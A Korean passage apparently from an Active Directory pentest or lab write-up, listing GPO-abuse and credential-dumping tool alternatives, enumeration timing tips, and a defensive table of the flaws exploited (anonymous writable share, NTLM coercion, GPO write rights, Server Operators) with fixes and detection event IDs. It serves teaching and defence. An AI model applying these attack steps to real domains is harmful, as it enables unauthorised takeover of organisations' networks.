   - SharpGPOAbuse 없이 GPO 수정 → `pygpoabuse`(파이썬, Kali에서 실행) 또는 SYSVOL의 `GptTmpl.inf`를 손으로 편집 후 versionNumber 증가
   - secretsdump 없이 → `impacket-secretsdump`는 수동 후속 도구라 허용. 자동 익스플로잇이 아니다

8. **시간 배분** — 웹 없는 AD는 **SMB/LDAP 열거 15분**에 승부가 갈린다. 여기서 진입점(쓰기 공유·익명 LDAP·AS-REP)이 안 나오면 사용자 스프레이·비번 재사용으로 넘어간다. 특권 확인은 셸 잡은 **첫 30초**(`whoami /priv` 한 줄)에 끝난다.

``````

### 원본 §8. 방어 관점 — 1184~1197행 (14줄)

``````text
## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| `DocumentsShare`가 익명 쓰기 허용 | 익명/Everyone 쓰기 제거. 공유 권한과 NTFS 권한을 **최소 권한**으로. 인증된 사용자에게만 |
| 사용자/서비스가 미끼 폴더를 자동으로 연다 | 신뢰되지 않은 공유의 자동 미리보기·인덱싱 비활성. 탐색기 미리보기 창 GPO로 제한 |
| NTLM이 임의 SMB 서버에 자동 인증 | GPO **"Restrict NTLM: Outgoing NTLM traffic = Deny all"** (예외는 명시 목록). SMB 서명 강제(이미 되어 있음) |
| `anirudh` 비밀번호 `SecureHM` (약함) | 비밀번호 정책 + 유출 사전 차단. 강제 인증당해도 크랙 안 되면 진입 실패 |
| 일반 사용자가 GPO에 쓰기 권한 | `Default Domain Policy`·`Default Domain Controllers Policy`의 위임 검토. **사람 계정에 GPO 편집 위임 금지.** `GenericWrite`/`WriteDacl`이 걸린 principal 정기 감사(BloodHound로 자가 진단) |
| `anirudh`가 **Server Operators** 멤버 | 이 그룹은 사실상 DC 관리자급이다. 서비스 계정·일반 사용자를 넣지 않는다. `SeBackup`/`SeRestore`가 딸려온다 |
| DC RDP + NLA 비활성 | NLA 강제. utilman/sticky keys 치환 탐지(System32 접근성 바이너리 무결성 모니터링) |

**탐지**: Event ID **5145**(공유 파일 접근)로 `DocumentsShare`의 미끼 파일명(`desktop.ini`·`.scf`·`.lnk`) 생성 감시, **4624 Type 3 + NTLM**이 외부 IP로 나가는 흐름, **5136/5137**(디렉터리 객체 변경)으로 GPO `versionNumber`·`gPCMachineExtensionNames` 변경, SYSVOL `GptTmpl.inf` 파일 변경(4663). **GPO의 Restricted Groups 변경은 정상 운영에서 극히 드물다 — 발생 즉시 조사 대상.**

``````

**삭제 원문 합계 334행.**
